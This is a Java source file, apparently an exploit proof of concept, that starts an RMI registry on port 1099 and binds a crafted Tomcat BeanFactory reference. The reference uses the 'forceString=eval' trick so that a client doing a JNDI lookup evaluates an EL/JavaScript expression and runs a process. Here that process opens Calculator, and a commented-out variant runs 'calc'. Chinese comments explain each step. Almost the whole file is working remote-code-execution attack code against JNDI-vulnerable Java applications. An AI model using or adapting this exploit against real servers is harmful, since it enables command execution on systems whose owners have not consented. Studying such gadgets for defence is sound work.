package localfactory;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class TomcatBeanFactoryServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        // 并且factoryReference一定要为null, 否则会抛出异常
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
//        // 强制将 'x' 属性的setter 从 'setX' 变为 'eval', 详细逻辑见 BeanFactory.getObjectInstance 代码
//        ref.add(new StringRefAddr("forceString", "bitterz=eval"));
        // 指定bitterz属性指定其setter方法需要的参数，实际是ElProcessor.eval方法执行的参数，利用表达式执行命令
//        ref.add(new StringRefAddr("bitterz", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open', '/System/Applications/Calculator.app']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Calc", referenceWrapper);  // 绑定目录名
        System.out.println("Server Started!");
    }
}